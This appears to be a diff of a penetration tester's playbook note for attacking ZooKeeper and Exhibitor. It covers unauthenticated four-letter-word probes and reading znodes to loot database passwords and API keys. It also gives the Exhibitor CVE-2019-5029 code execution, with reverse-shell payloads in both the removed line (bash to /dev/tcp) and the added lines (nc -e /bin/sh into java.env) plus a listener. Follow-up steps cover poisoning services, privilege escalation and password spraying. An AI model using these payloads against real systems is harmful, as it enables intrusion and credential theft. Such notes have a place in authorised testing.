@@ -1,34 +1,38 @@
-# ZooKeeper / Exhibitor
+# ZooKeeper and Exhibitor
 
 ## Before I start
-- [ ] 2181 (ZooKeeper) and/or 8080 (Exhibitor) open
+- [ ] 2181, ZooKeeper, or 8080, Exhibitor, open
 
 ## ZooKeeper: four-letter words
 echo envi | nc <TargetIP> 2181
 echo stat | nc <TargetIP> 2181
 echo conf | nc <TargetIP> 2181
 echo dump | nc <TargetIP> 2181
-- [ ] envi = version/host/paths; imok from ruok = alive
-- [ ] No auth by default — this is normal, not a finding by itself
+- [ ] envi gives the version, host and paths; ruok answers imok when it is alive
+- [ ] No login by default: that is how ZooKeeper ships, not a finding by itself
 
 ## Read the znodes
-zkCli.sh -server <TargetIP>:2181
+zkCli.sh, after sudo apt install -y zookeeper:
+/usr/share/zookeeper/bin/zkCli.sh -server <TargetIP>:2181
+Then, at its prompt, with THE-ZNODE a path from the listing:
 ls /
-get /config/app
-- [ ] App configs in znodes = DB passwords, API keys, cleartext
-- [ ] No ACLs = write too → poison downstream services
+get THE-ZNODE
+- [ ] Applications keep their configuration in znodes: database passwords and API keys, in plain text
+- [ ] No ACLs means I can write as well: the services that read them poisoned
 
-## Exhibitor (8080) → CVE-2019-5029 RCE
-curl -s http://target:8080/exhibitor/v1/config/get-state | jq
-curl -X POST http://target:8080/exhibitor/v1/config/set -H 'Content-Type: application/json' -d '{"javaEnvironment":"$(/bin/bash -c \"bash -i >& /dev/tcp/<AttackerIP>/443 0>&1\" &)"}'
-- [ ] java.env gets the $() executed on config rollout/restart
-nc -lvnp 443
-- [ ] ≤1.7.1 for the CVE; newer still gives unauth config read = znode loot
+## Exhibitor on 8080: CVE-2019-5029
+curl -s http://<TargetIP>:8080/exhibitor/v1/config/get-state | jq
+searchsploit exhibitor
+rlwrap nc -lvnp <LPORT>
+- [ ] In the web UI: Config, Editing on, the java.env script set to the line below, then Commit, All At Once
+$(/bin/nc -e /bin/sh <LHOST> <LPORT> &)
+- [ ] Exhibitor runs whatever is inside $() when it next starts ZooKeeper, which can take up to a minute
+- [ ] Versions 1.0.9 to 1.7.1 for the CVE; get-state still shows the configuration with no login where the command does not run
 
 ## If it fails
-- [ ] 2181 refuses four-letter words → whitelisted commands only; zkCli still worth a shot
-- [ ] Exhibitor authed → loot znode creds first, they often unlock it
+- [ ] 2181 refuses the four-letter words: only the allowed ones answer, and zkCli.sh is still worth a try
+- [ ] Exhibitor asks for a login: credentials from the znodes first, which often open it
 
 ## Next
-- [ ] Shell as exhibitor/zookeeper → :Pb linux-enum, :Pb sudo
-- [ ] App creds from znodes → :Pb spraying
+- [ ] A shell as exhibitor or zookeeper: :Pb linux-enum, :Pb sudo
+- [ ] Application credentials from the znodes: :Pb spraying
